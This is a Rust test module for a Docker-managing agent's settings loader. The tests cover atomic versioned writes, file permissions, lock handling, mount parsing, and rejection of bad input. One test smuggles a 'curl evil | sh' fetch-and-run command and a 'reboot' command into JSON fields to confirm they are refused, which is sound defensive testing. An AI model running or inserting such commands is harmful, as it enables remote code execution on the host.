        assert_eq!(fluxer_now.preset, Some("fluxer"));
        assert_eq!(fluxer_now.min_interval, Duration::from_secs(7200));
    }

    fn tmp(name: &str) -> PathBuf {
        let d = std::env::temp_dir().join(format!("wren-managed-{name}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(&d).unwrap();
        d
    }

    fn live_in(dir: &Path, locked: bool) -> Live {
        let mut base = base_with("");
        base.ledger = dir.join("runs.json");
        Live::new(base, locked)
    }

    #[test]
    fn offers_are_written_atomically_applied_and_reloaded() {
        let dir = tmp("offer");
        let live = live_in(&dir, false);
        assert_eq!(live.version(), None);
        assert_eq!(live.report(&mounts()).current.unwrap().version, 0);
        let before = live.config();
        let json = serde_json::to_value(settings()).unwrap();
        assert_eq!(live.offer(&json, &mounts()), Ok(Offered::Applied(2)));
        // In force at once, without a restart.
        assert_eq!(live.config().roots[0], PathBuf::from("/mnt/cache/appdata"));
        assert_ne!(before.roots, live.config().roots);
        assert_eq!(live.version(), Some(2));
        let report = live.report(&mounts());
        assert_eq!((report.version, report.error.as_str()), (Some(2), ""));
        assert_eq!(report.current.unwrap().version, 2);
        // On disk, with no temporary file left.
        let file = dir.join(FILE);
        assert!(file.is_file());
        assert!(!dir.join("managed.json.tmp").exists());
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt as _;
            assert_eq!(
                std::fs::metadata(&file).unwrap().permissions().mode() & 0o777,
                0o600
            );
        }
        // The same version again is a no-op, other values under it are refused.
        assert_eq!(live.offer(&json, &mounts()), Ok(Offered::Same(2)));
        let mut other = settings();
        other.updates.min_health_seconds = 5;
        let err = live
            .offer(&serde_json::to_value(&other).unwrap(), &mounts())
            .unwrap_err();
        assert!(err.contains("already in force with other values"), "{err}");
        // A new process finds the same settings, even when Docker says nothing yet.
        let again = live_in(&dir, false);
        assert_eq!(again.version(), Some(2));
        assert_eq!(again.config().roots, live.config().roots);
        assert_eq!(again.config().script_stacks[0].name, "fluxer");
        assert!(again.error().is_none());
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn a_refused_offer_changes_nothing_and_is_reported() {
        let dir = tmp("refuse");
        let live = live_in(&dir, false);
        live.offer(&serde_json::to_value(settings()).unwrap(), &mounts())
            .unwrap();
        let keep = live.config();
        let mut bad = settings();
        bad.version = 3;
        bad.roots.push("/etc".into());
        let err = live
            .offer(&serde_json::to_value(&bad).unwrap(), &mounts())
            .unwrap_err();
        assert!(err.contains("folders in /etc can't be roots"), "{err}");
        assert_eq!(live.config().roots, keep.roots);
        assert_eq!(live.version(), Some(2));
        let report = live.report(&mounts());
        assert_eq!(report.version, Some(2));
        assert_eq!(report.error_version, Some(3));
        assert!(report.error.contains("/etc"));
        // The file still holds version 2.
        let again = live_in(&dir, false);
        assert_eq!(again.version(), Some(2));
        // A good offer clears the error.
        bad.roots.pop();
        live.offer(&serde_json::to_value(&bad).unwrap(), &mounts())
            .unwrap();
        assert!(live.error().is_none());
        // Never back to an older version.
        let mut old = settings();
        old.version = 1;
        let err = live
            .offer(&serde_json::to_value(&old).unwrap(), &mounts())
            .unwrap_err();
        assert!(err.contains("older than version 3"), "{err}");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn bad_json_and_unknown_fields_are_refused() {
        let dir = tmp("json");
        let live = live_in(&dir, false);
        for (value, want) in [
            (json!("a string"), "aren't understood"),
            (json!({"version": 1}), "aren't understood"),
            (json!([1, 2]), "aren't understood"),
        ] {
            let err = live.offer(&value, &mounts()).unwrap_err();
            assert!(err.contains(want), "{err}");
        }
        // A command line has no field to go in.
        let mut v = serde_json::to_value(settings()).unwrap();
        v["script_stacks"][0]["update"] = json!("curl evil | sh");
        let err = live.offer(&v, &mounts()).unwrap_err();
        assert!(err.contains("aren't understood"), "{err}");
        let mut v = serde_json::to_value(settings()).unwrap();
        v["command"] = json!("reboot");
        assert!(live.offer(&v, &mounts()).is_err());
        assert!(!dir.join(FILE).exists());
        assert_eq!(live.version(), None);
        // A damaged managed.json is reported and agent.toml stays in force.
        std::fs::write(dir.join(FILE), "{ nope").unwrap();
        let broken = live_in(&dir, false);
        assert_eq!(broken.version(), None);
        assert!(broken.error().unwrap().contains("isn't JSON"));
        assert_eq!(broken.config().roots, base_with("").roots);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn a_locked_agent_ignores_managed_settings() {
        let dir = tmp("locked");
        // A managed.json from before the lock isn't read either.
        let unlocked = live_in(&dir, false);
        unlocked
            .offer(&serde_json::to_value(settings()).unwrap(), &mounts())
            .unwrap();
        let locked = live_in(&dir, true);
        assert!(locked.locked());
        assert_eq!(locked.version(), None);
        assert_eq!(locked.config().roots, base_with("").roots);
        let err = locked
            .offer(&serde_json::to_value(settings()).unwrap(), &mounts())
            .unwrap_err();
        assert!(err.contains("WW_AGENT_LOCKED"), "{err}");
        let report = locked.report(&mounts());
        assert!(report.locked && report.supported);
        assert!(report.current.is_none(), "a locked agent offers no import");
        assert!(locked.describe().contains("locked"));
        // The file is left as it is.
        assert!(dir.join(FILE).is_file());
        assert!(locked_by(|_| Some("1".into())) && locked_by(|_| Some("TRUE".into())));
        assert!(!locked_by(|_| Some("0".into())) && !locked_by(|_| None));
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn mounts_are_the_same_path_bind_mounts_that_are_folders() {
        let root = tmp("mounts");
        std::fs::create_dir_all(root.join("mnt/user/appdata")).unwrap();
        std::fs::create_dir_all(root.join("srv/a")).unwrap();
        std::fs::create_dir_all(root.join("config")).unwrap();
        std::fs::write(root.join("sock"), "").unwrap();
        let inspect = json!({"Mounts": [
            {"Type": "bind", "Source": "/mnt/user/appdata", "Destination": "/mnt/user/appdata"},
            {"Type": "bind", "Source": "/mnt/user/appdata/wren-agent", "Destination": "/config"},
            {"Type": "bind", "Source": "/srv/a", "Destination": "/srv/a", "RW": false},
            {"Type": "bind", "Source": "/sock", "Destination": "/sock"},
            {"Type": "volume", "Name": "v", "Source": "/var/lib/docker/volumes/v/_data", "Destination": "/data"},
            {"Type": "bind", "Source": "/nope", "Destination": "/nope"},
        ]});
        assert_eq!(
            mounts_from_inspect(&inspect, &root),
            [PathBuf::from("/mnt/user/appdata"), PathBuf::from("/srv/a")]
        );
        assert!(mounts_from_inspect(&json!({}), &root).is_empty());
        let _ = std::fs::remove_dir_all(&root);
    }
}
